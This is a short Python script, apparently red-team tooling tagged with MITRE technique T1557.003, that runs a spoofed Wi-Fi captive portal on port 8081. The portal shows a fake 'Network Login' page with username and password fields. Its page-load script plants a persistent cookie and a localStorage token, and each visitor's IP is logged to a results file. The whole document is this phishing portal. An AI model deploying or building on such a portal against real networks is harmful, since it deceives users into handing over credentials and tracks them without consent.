#!/usr/bin/env python3

import http.server, socketserver, json, os, argparse, time
from datetime import datetime

PORT = 8081
PHISH_PAGE = "captive_autoauth.html"
LOG_FILE = "results/browser_wifi_autoauth_log.json"
MITRE_TTP = "T1557.003"

def log_hit(ip):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip,
        "ttp": MITRE_TTP
    }
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

class AutoauthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = f"""
            <html><head><script>
            document.cookie="SSID=phishednetwork; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT";
            localStorage.setItem("autoLoginToken", "hacked");
            </script></head>
            <body><h2>Network Login</h2><form><input name='u'><input name='p' type='password'></form></body></html>"""
            self.wfile.write(html.encode())
            log_hit(self.client_address[0])
        else:
            self.send_error(404)

def serve():
    with socketserver.TCPServer(("", PORT), AutoauthHandler) as httpd:
        print(f"[+] Auto-auth Wi-Fi spoofing portal running on port {PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    serve()
